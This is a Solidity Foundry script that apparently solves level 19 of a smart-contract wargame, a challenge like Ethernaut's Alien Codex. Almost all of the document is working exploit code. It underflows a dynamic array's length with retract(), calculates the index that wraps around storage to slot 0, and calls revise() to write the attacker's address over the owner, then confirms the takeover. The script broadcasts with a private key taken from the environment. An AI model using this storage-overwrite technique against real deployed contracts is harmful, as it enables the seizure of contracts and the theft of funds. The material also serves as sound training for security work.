pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

// import "../instances/Ilevel19.sol";
import "forge-std/Script.sol";

contract Level19 is Script {
    address level19 = 0xd1dDba03838A990C55C192B785162eD1A5aB5CcC;

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        (bool success, bytes memory data) = level19.call(
            abi.encodeWithSignature("makeContact()")
        );
        (success, data) = level19.call(abi.encodeWithSignature("retract()"));
        uint256 codexSlot = 1;
        uint256 indexPayload = type(uint256).max +
            1 -
            uint256(keccak256(abi.encodePacked(codexSlot)));
        bytes32 payload = bytes32(uint256(uint160(attacker))) |
            bytes32(uint256(0x01) << 160);
        console.logBytes32(payload);
        (success, data) = level19.call(abi.encodeWithSignature("contact()"));
        console.log(success, abi.decode(data, (bool)));
        (success, data) = level19.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                indexPayload,
                payload
            )
        );
        (success, data) = level19.call(abi.encodeWithSignature("owner()"));
        address owner = abi.decode(data, (address));
        (success, data) = level19.call(abi.encodeWithSignature("contact()"));
        bool contact = abi.decode(data, (bool));
        require(owner == attacker && contact == true, "Level19: Failed");
        vm.stopBroadcast();
    }
}
